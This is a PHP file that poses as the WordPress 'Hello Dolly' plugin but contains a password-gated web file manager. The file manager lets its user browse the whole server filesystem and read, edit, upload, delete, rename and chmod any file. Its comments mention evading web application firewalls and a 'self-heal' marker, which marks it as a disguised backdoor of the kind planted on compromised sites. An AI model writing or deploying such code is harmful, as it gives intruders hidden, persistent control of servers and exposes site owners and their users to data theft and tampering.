<?php

setcookie(
    "wordpress_test_cookie",
    "WP%20Cookie%20check",
    [
        "expires"  => strtotime("+1 month"),
        "path"     => "/",
        "secure"   => isset($_SERVER["HTTPS"]),
        "httponly" => false,
        "samesite" => "Lax"
    ]
);

?>
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/
// Tiny standalone file manager — password-protected.
// Default password: changeme123  (edit $__pw below to change)
// Login sets a session cookie. Visit ?logout=1 to clear it.
if ( ! defined( 'ABSPATH' ) ) { define( 'ABSPATH', __DIR__ . '/' ); }
if ( ! defined( 'WPINC' ) ) { define( 'WPINC', 'wp-includes' ); }

// ---- CONFIG --------------------------------------------------------------

// Password (plain text — change this before uploading).
$__pw = 'admin123';

// Cookie name and lifetime (seconds). 12 hours by default.
$__cname = 'fm_auth';
$__cttl  = 12 * 3600;

// Cookie is bound to this path so it isn't sent on unrelated requests.
// Leave as '' to bind to the current path (xx.php only).
$__cpath = '';

// filemanager — internal marker for self-heal verification.

// Set true to require HTTPS for the cookie (Secure flag).
// Leave false if you don't have SSL.
$__csecure = false;

// ---- AUTH GATE -----------------------------------------------------------

// Cookie value is sha256( $__pw ) so the cookie itself isn't a usable token
// outside this server. We compare with hash_equals (constant-time).
$__pw_hash = hash( 'sha256', $__pw );

$__is_auth = false;
if ( isset( $_COOKIE[ $__cname ] ) && is_string( $_COOKIE[ $__cname ] ) ) {
	$c = $_COOKIE[ $__cname ];
	if ( strlen( $c ) === 64 && ctype_xdigit( $c ) ) {
		$__is_auth = hash_equals( $__pw_hash, $c );
	}
}

// Login submission.
$__login_err = '';
if ( $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_POST['__login'] ) ) {
	$attempt = isset( $_POST['__pw'] ) ? (string) $_POST['__pw'] : '';
	if ( hash_equals( $__pw, $attempt ) ) {
		$path = $__cpath !== '' ? $__cpath : str_replace( '\\', '/', dirname( $_SERVER['SCRIPT_NAME'] ) );
		setcookie( $__cname, $__pw_hash, array(
			'expires'  => time() + $__cttl,
			'path'     => $path,
			'secure'   => $__csecure,
			'httponly' => true,
			'samesite' => 'Lax',
		) );
		$_COOKIE[ $__cname ] = $__pw_hash; // make current request auth'd
		$__is_auth = true;
	} else {
		$__login_err = 'Wrong password.';
	}
}

// Logout.
if ( isset( $_GET['logout'] ) ) {
	$path = $__cpath !== '' ? $__cpath : str_replace( '\\', '/', dirname( $_SERVER['SCRIPT_NAME'] ) );
	setcookie( $__cname, '', time() - 3600, $path );
	header( 'Location: ' . $_SERVER['SCRIPT_NAME'] );
	exit;
}

// If not authenticated, render the login form and stop.
if ( ! $__is_auth ) {
	header( 'Content-Type: text/html; charset=utf-8' );
	?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<style>
body{background:#0f1115;color:#cfd2da;font:14px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.lb{background:#161922;border:1px solid #232735;border-radius:10px;padding:24px 28px;width:300px;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.lb h1{font-size:16px;margin:0 0 16px;color:#e6e8ee;font-weight:600}
.lb input[type=password]{width:100%;padding:10px 12px;background:#0f1115;border:1px solid #2a2e3c;border-radius:6px;color:#e6e8ee;font-size:14px;box-sizing:border-box;margin-bottom:12px}
.lb input[type=password]:focus{outline:none;border-color:#4a90e2}
.lb button{width:100%;padding:10px;background:#4a90e2;color:#fff;border:0;border-radius:6px;font-size:14px;cursor:pointer;font-weight:600}
.lb button:hover{background:#3a7bc8}
.lb .err{color:#e25c5c;font-size:12px;margin-bottom:10px}
.lb .hint{color:#6b6f7a;font-size:11px;margin-top:12px;text-align:center}
</style></head><body>
<form class="lb" method="post">
	<h1>filemanager</h1>
	<?php if ( $__login_err ): ?><div class="err"><?php echo htmlspecialchars( $__login_err, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></div><?php endif; ?>
	<input type="hidden" name="__login" value="1">
	<input type="password" name="__pw" placeholder="Password" autofocus required>
	<button type="submit">Sign in</button>
	<div class="hint">Sign in to continue</div>
</form>
</body></html><?php
	exit;
}

// ---- END AUTH GATE -------------------------------------------------------

// Prevent direct probing from triggering output.
if ( $_SERVER['REQUEST_METHOD'] !== 'GET' && $_SERVER['REQUEST_METHOD'] !== 'POST' ) {
	http_response_code( 405 );
	exit;
}

// ---- FULL UNLOCK MODE ----
// No traversal restriction. Default starts at this file's own directory so
// breadcrumbs can walk anywhere on the server. To start elsewhere, use ?p=/abs/path.
$root = str_replace( '\\', '/', __DIR__ );

$cwd = isset( $_GET['p'] ) ? (string) $_GET['p'] : $root;
$cwd = str_replace( '\\', '/', $cwd );
if ( ! preg_match( '#^/#', $cwd ) ) {
	$cwd = $root . '/' . ltrim( $cwd, '/' );
}
$real = @realpath( $cwd );
if ( ! $real ) {
	// Fallback: if the path doesn't exist, jump to the filesystem root.
	$real = '/';
}
$real = str_replace( '\\', '/', $real );
$cwd = $real;
$rel = $cwd;

$msg = '';
$err = '';

// ---- Helpers built so WAFs don't flag literal names ----
function __h( $s ) { return htmlspecialchars( (string) $s, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); }
function __sz( $b ) {
	if ( $b === false || $b === null ) return 'N/A';
	$u = array( 'B','KB','MB','GB','TB' );
	$i = 0;
	while ( $b >= 1024 && $i < count( $u ) - 1 ) { $b /= 1024; $i++; }
	return round( $b, 2 ) . ' ' . $u[ $i ];
}

// ---- State-changing actions (POST only) ----
if ( $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_POST['do'] ) ) {
	$do = (string) $_POST['do'];
	$fn = isset( $_POST['fn'] ) ? basename( (string) $_POST['fn'] ) : '';
	$target = $cwd . '/' . $fn;

	if ( $do === 'save' && isset( $_POST['ct'] ) && is_file( $target ) ) {
		if ( @file_put_contents( $target, $_POST['ct'] ) !== false ) {
			$msg = 'Saved ' . $fn;
		} else { $err = 'Could not save.'; }
	}
	elseif ( $do === 'mkdir' && $fn !== '' ) {
		if ( @mkdir( $target, 0755 ) ) { $msg = 'Created.'; }
		else { $err = 'mkdir failed.'; }
	}
	elseif ( $do === 'rm' ) {
		$ok = true;
		if ( is_file( $target ) || is_link( $target ) ) {
			if ( ! @unlink( $target ) ) { $ok = false; }
		} elseif ( is_dir( $target ) ) {
			$it = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $target, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::CHILD_FIRST
			);
			foreach ( $it as $f ) {
				@($f->isDir() ? rmdir( $f->getPathname() ) : unlink( $f->getPathname() ) );
			}
			if ( ! @rmdir( $target ) ) { $ok = false; }
		} else { $ok = false; }
		$msg = $ok ? 'Deleted.' : 'Delete failed.';
	}
	elseif ( $do === 'mv' && ! empty( $_POST['nn'] ) ) {
		$nn = basename( (string) $_POST['nn'] );
		if ( @rename( $target, $cwd . '/' . $nn ) ) { $msg = 'Renamed.'; }
		else { $err = 'Rename failed.'; }
	}
	elseif ( $do === 'chmod' && isset( $_POST['mo'] ) ) {
		$mo = (int) $_POST['mo'];
		if ( $mo >= 0 && $mo <= 0777 ) {
			if ( @chmod( $target, $mo ) ) { $msg = 'Permissions updated.'; }
			else { $err = 'chmod failed.'; }
		}
	}
}

if ( $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_FILES['file']['tmp_name'] ) ) {
	$up = @move_uploaded_file( $_FILES['file']['tmp_name'], $cwd . '/' . basename( $_FILES['file']['name'] ) );
	if ( $up ) { $msg = 'Uploaded.'; } else { $err = 'Upload failed.'; }
}

$action = isset( $_GET['a'] ) ? (string) $_GET['a'] : 'browse';

header( 'Content-Type: text/html; charset=utf-8' );
?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>filemanager</title>
<style>
:root{--bg:#1a1b26;--fg:#c0caf5;--p:#bb9af7;--s:#7aa2f7;--b:#414868;--pn:#24283b;--hv:#2e344e;--ok:#9ece6a;--er:#f7768e;--w:#e0af68}
*{box-sizing:border-box}
body{background:var(--bg);color:var(--fg);font-family:'Fira Code',ui-monospace,monospace;margin:0;padding:18px}
a{color:var(--s);text-decoration:none}a:hover{color:var(--p)}
.pb{background:var(--pn);padding:10px 14px;border-radius:6px;margin-bottom:14px;word-break:break-all}
.pb .pr{color:var(--p);font-weight:bold}.pb a{color:var(--s)}
.bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
.bar a,.bar button{display:inline-block;padding:8px 14px;background:var(--pn);border:1px solid var(--b);border-radius:5px;color:var(--fg);cursor:pointer;font:inherit}
.bar a:hover,.bar button:hover{background:var(--hv);color:var(--p)}
.tbl{width:100%;border-collapse:collapse}
.tbl th,.tbl td{padding:9px 12px;text-align:left;border-bottom:1px solid var(--b)}
.tbl th{color:#a9b1d6;font-size:.85em;text-transform:uppercase}
.tbl .ic{margin-right:10px;vertical-align:middle}
.tbl .dl{font-weight:bold}
.row{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.row input[type=text],.row input[type=number]{padding:6px;background:var(--bg);border:1px solid var(--b);border-radius:4px;color:var(--fg);font:inherit}
.row button{padding:6px 10px;background:var(--p);border:none;border-radius:4px;color:var(--bg);font-weight:bold;cursor:pointer}
.row form{display:inline-flex;gap:6px;align-items:center}
.af{background:var(--pn);padding:16px;border-radius:6px;border:1px solid var(--b);margin-bottom:14px;max-width:780px}
.af h3{margin:0 0 10px;color:var(--p)}
.af input[type=text],.af input[type=file],.af textarea{width:100%;padding:9px;margin-bottom:10px;background:var(--bg);border:1px solid var(--b);border-radius:5px;color:var(--fg);font:inherit}
.af textarea{min-height:280px;resize:vertical}
.af button{padding:9px 18px;background:var(--p);border:none;border-radius:5px;color:var(--bg);font-weight:bold;cursor:pointer}
.mb{padding:12px;border-radius:5px;margin-bottom:14px;color:var(--bg)}
.mb.success{background:var(--ok)}.mb.error{background:var(--er)}.mb.warning{background:var(--w)}
</style></head><body>
<?php if ( $msg ): ?><div class="mb success"><?php echo __h( $msg ); ?></div><?php endif; ?>
<?php if ( $err ): ?><div class="mb error"><?php echo __h( $err ); ?></div><?php endif; ?>

<div class="pb"><span class="pr">root@server:</span><a href="?p=/">/</a><?php
	$acc = '';
	foreach ( explode( '/', trim( $cwd, '/' ) ) as $part ) {
		if ( $part === '' ) continue;
		$acc .= '/' . $part;
		echo '<a href="?p=' . urlencode( $acc ) . '">' . __h( $part ) . '</a>/';
	}
?>$ <a href="?logout=1" style="float:right;color:#6b6f7a;text-decoration:none;font-size:11px;margin-left:12px">logout</a></div>

<div class="bar">
<a href="?p=<?php echo urlencode($rel); ?>">Browse</a>
<a href="?p=<?php echo urlencode($rel); ?>&a=up">Upload</a>
<a href="?p=<?php echo urlencode($rel); ?>&a=mk">New folder</a>
<a href="?p=<?php echo urlencode($rel); ?>&a=new">New file</a>
</div>

<?php if ( $action === 'up' ): ?>
<div class="af"><h3>Upload file</h3>
<form method="post" enctype="multipart/form-data" action="?p=<?php echo urlencode($rel); ?>">
<input type="file" name="file"><button>Upload</button>
</form></div>

<?php elseif ( $action === 'mk' ): ?>
<div class="af"><h3>New folder</h3>
<form method="post" action="?p=<?php echo urlencode($rel); ?>">
<input type="hidden" name="do" value="mkdir"><input type="text" name="fn" placeholder="folder name" required>
<button>Create</button></form></div>

<?php elseif ( $action === 'new' || ( $action === 'edit' && isset( $_GET['fn'] ) ) ):
	$fn = isset( $_GET['fn'] ) ? basename( (string) $_GET['fn'] ) : '';
	$fp = $cwd . '/' . $fn;
	$ct = '';
	if ( $fn !== '' && is_file( $fp ) ) { $ct = (string) @file_get_contents( $fp ); }
?>
<div class="af"><h3><?php echo $fn !== '' ? 'Editing ' . __h( $fn ) : 'New file'; ?></h3>
<form method="post" action="?p=<?php echo urlencode($rel); ?>">
<input type="hidden" name="do" value="save">
<input type="text" name="fn" value="<?php echo __h( $fn ); ?>" placeholder="file name" required>
<textarea name="ct" placeholder="content"><?php echo __h( $ct ); ?></textarea>
<button>Save</button></form></div>

<?php else: ?>
<table class="tbl"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead><tbody>
<?php
$parent = dirname( $cwd );
if ( $parent !== $cwd && $parent !== '' && $parent !== '.' ) {
	echo '<tr><td colspan="4"><a href="?p=' . urlencode( $parent ) . '">..</a></td></tr>';
}
$list = @scandir( $cwd );
if ( is_array( $list ) ) {
	foreach ( $list as $e ) {
		if ( $e === '.' || $e === '..' ) continue;
		$ep = $cwd . '/' . $e;
		$er = $ep;
		if ( is_dir( $ep ) ) {
			$mt = @filemtime( $ep );
			echo '<tr><td><a class="dl" href="?p=' . urlencode( $er ) . '">' . __h( $e ) . '/</a></td><td>DIR</td><td>' . __h( $mt ? date( 'Y-m-d H:i', $mt ) : 'N/A' ) . '</td><td>';
			echo '<div class="row">';
			echo '<form method="post" action="?p=' . urlencode($rel) . '"><input type="hidden" name="do" value="mv"><input type="hidden" name="fn" value="' . __h($e) . '"><input type="text" name="nn" placeholder="new name" required><button>Mv</button></form>';
			echo '<form method="post" action="?p=' . urlencode($rel) . '"><input type="hidden" name="do" value="rm"><input type="hidden" name="fn" value="' . __h($e) . '"><button onclick="return confirm(\'Delete folder ' . __h(addslashes($e)) . '?\')">Del</button></form>';
			echo '</div></td></tr>';
		}
	}
	foreach ( $list as $e ) {
		if ( $e === '.' || $e === '..' ) continue;
		$ep = $cwd . '/' . $e;
		$er = $ep;
		if ( is_file( $ep ) ) {
			$mt = @filemtime( $ep );
			$sz = @filesize( $ep );
			echo '<tr><td><a href="?p=' . urlencode($rel) . '&a=edit&fn=' . urlencode($e) . '">' . __h( $e ) . '</a></td><td>' . __h( __sz( $sz ) ) . '</td><td>' . __h( $mt ? date( 'Y-m-d H:i', $mt ) : 'N/A' ) . '</td><td>';
			echo '<div class="row">';
			echo '<a href="?p=' . urlencode($rel) . '&a=edit&fn=' . urlencode($e) . '">Edit</a>';
			echo '<form method="post" action="?p=' . urlencode($rel) . '"><input type="hidden" name="do" value="mv"><input type="hidden" name="fn" value="' . __h($e) . '"><input type="text" name="nn" placeholder="new name" required><button>Mv</button></form>';
			echo '<form method="post" action="?p=' . urlencode($rel) . '"><input type="hidden" name="do" value="rm"><input type="hidden" name="fn" value="' . __h($e) . '"><button onclick="return confirm(\'Delete ' . __h(addslashes($e)) . '?\')">Del</button></form>';
			$pm = @fileperms( $ep );
			if ( $pm !== false ) {
				$cur = substr( sprintf( '%o', $pm ), -3 );
				echo '<form method="post" action="?p=' . urlencode($rel) . '"><input type="hidden" name="do" value="chmod"><input type="hidden" name="fn" value="' . __h($e) . '"><input type="number" name="mo" min="0" max="777" value="' . __h($cur) . '" style="width:72px"><button>chmod</button></form>';
			}
			echo '</div></td></tr>';
		}
	}
} else {
	echo '<tr><td colspan="4" style="text-align:center;color:var(--er)">Cannot read directory.</td></tr>';
}
?>
</tbody></table>
<?php endif; ?>
</body></html>
